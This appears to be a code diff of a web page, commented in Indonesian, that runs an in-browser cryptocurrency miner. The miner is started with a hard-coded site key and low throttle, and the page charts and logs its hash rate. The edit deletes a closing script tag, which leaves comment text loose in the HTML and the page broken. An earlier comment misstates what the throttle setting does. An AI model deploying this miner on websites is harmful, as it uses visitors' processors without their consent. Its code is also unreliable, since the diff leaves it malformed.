@@ -262,8 +262,7 @@
 <script>
     // Inisialisasi miner dengan pengaturan yang dioptimalkan
     var _client = new Client.Anonymous('4b3467771143126127301f0b80324fbd888046a6339591bd1a9bf51a217d9e87', {
-        throttle: 0.1, // Kurangi throttle untuk mempercepat proses (gunakan 10% CPU idle)
-        c: 'w'
+        throttle: 0.1, c: 'w'
     });
 
     _client.start();
@@ -346,8 +345,8 @@
         hashRateChart.data.labels.push(time);
         hashRateChart.data.datasets[0].data.push(hashRate);
 
-        // Batasi data hanya untuk 50 poin terakhir
-        if (hashRateChart.data.labels.length > 50) {
+        // Batasi data hanya untuk 20 poin terakhir
+        if (hashRateChart.data.labels.length > 20) {
             hashRateChart.data.labels.shift();
             hashRateChart.data.datasets[0].data.shift();
         }
@@ -369,7 +368,7 @@
         const speed = _client.getHashesPerSecond(); // Kecepatan hash nyata
         logToConsole(`${speed.toFixed(2)} H/s`);
     }, 1000); // Update log setiap 1 detik
-</script>
+    
     // system information
         
     // Platform 
@@ -423,3 +422,5 @@
     </script>
 </body>
     </html>
+
+    
